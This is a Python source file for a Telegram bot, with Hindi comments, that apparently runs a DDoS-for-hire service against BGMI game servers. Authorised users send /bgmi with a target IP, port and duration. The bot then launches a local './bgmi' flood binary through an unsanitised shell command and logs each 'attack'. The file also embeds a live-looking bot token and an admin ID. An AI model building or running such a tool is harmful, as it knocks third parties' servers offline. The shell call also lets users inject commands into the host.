import telebot
import subprocess
import datetime
import os
import time

# [!] अपना बोट टोकन यहाँ डालें
bot = telebot.TeleBot('7687232558:AAHxqNx7aNb-qzlc3gSgGb8F24jFZabYCxQ')

# Admin user ID (List format for better check)
admin_id = ["954990872"]

# Files to store data
USER_FILE = "users.txt"
LOG_FILE = "log.txt"
FREE_USER_FILE = "free_users.txt" # डिफाइन कर दिया गया है ताकि एरर न आए

def read_users():
    if not os.path.exists(USER_FILE):
        return []
    with open(USER_FILE, "r") as file:
        return file.read().splitlines()

allowed_user_ids = read_users()

def log_command(user_id, target, port, duration):
    user_info = bot.get_chat(user_id)
    username = f"@{user_info.username}" if user_info.username else f"ID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Time: {datetime.datetime.now()} | User: {username} | Target: {target}:{port} | Duration: {duration}\n")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    response = f"🚀 Welcome! Your ID: {message.chat.id}\nUse /help to see commands."
    bot.reply_to(message, response)

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍"
            else: response = "User already exists."
        else: response = "Usage: /add <userid>"
    else: response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids or user_id in admin_id:
        command = message.text.split()
        if len(command) == 4: # /bgmi <target> <port> <time>
            target = command[1]
            port = command[2]
            duration = command[3]
            
            if int(duration) > 300:
                bot.reply_to(message, "Error: Max time is 300s.")
                return

            log_command(user_id, target, port, duration)
            bot.reply_to(message, f"🚀 ATTACK STARTED! 🔥\n\nTarget: {target}\nPort: {port}\nTime: {duration}s")
            
            # [!] सुनिश्चित करें कि आपकी बाइनरी का नाम 'bgmi' है और वह इसी फोल्डर में है
            full_command = f"./bgmi {target} {port} {duration} 12 900"
            
            try:
                subprocess.run(full_command, shell=True)
                bot.send_message(message.chat.id, f"✅ Attack Finished on {target}:{port}")
            except Exception as e:
                bot.send_message(message.chat.id, f"Error: {str(e)}")
        else:
            bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")
    else:
        bot.reply_to(message, "❌ Not Authorized! Contact Admin.")

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(message, "/bgmi <target> <port> <time>\n/id - Show your ID\n/mylogs - Recent attacks")

# Bot Polling with Auto-Restart
print("Bot is running...")
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Bot crashed, restarting... Error: {e}")
        time.sleep(5)